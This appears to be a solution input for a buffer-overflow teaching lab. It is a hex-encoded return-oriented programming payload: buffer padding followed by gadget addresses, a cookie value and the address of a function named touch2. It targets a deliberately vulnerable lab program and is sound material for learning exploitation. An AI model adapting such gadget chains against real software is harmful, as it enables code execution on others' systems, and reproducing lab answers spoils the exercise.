00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /*padding to buffer size*/
05 14 40 00 00 00 00 00 /*gadget1: popq %rax*/
b5 6a 84 3e 00 00 00 00 /*cookie*/
0b 14 40 00 00 00 00 00 /*gadget2: movq*/
54 12 40 00 00 00 00 00 /*touch2 address*/
